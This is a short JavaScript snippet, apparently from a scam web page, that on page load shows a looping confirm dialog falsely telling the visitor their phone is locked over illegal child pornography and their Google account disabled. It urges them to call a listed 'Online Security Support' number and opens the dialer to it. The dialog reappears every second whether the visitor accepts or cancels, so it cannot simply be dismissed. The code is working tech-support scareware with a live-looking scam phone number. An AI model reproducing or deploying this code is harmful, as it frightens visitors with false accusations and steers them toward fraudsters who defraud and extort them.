function showConfirmMessage() {
    let userResponse = confirm("Your Phone has been locked due to detected illegal Child pornography .Your Google Account  has been disabled . on! Immediately call Online Security Support +1(844) 906-6151 to unlock it!");
    
    if (userResponse) {
        // Open the dialer
        window.location.href = "tel:+1(844)906-6151";
        
        // Reopen the confirm message after dialing
        setTimeout(showConfirmMessage, 1000); // Delay for 1 second before reopening the message
    } else {
        console.log("User canceled the call.");
        setTimeout(showConfirmMessage, 1000); // Delay for 1 second before reopening the message
    }
}

window.onload = function() {
    showConfirmMessage(); // Call the function on page load
};
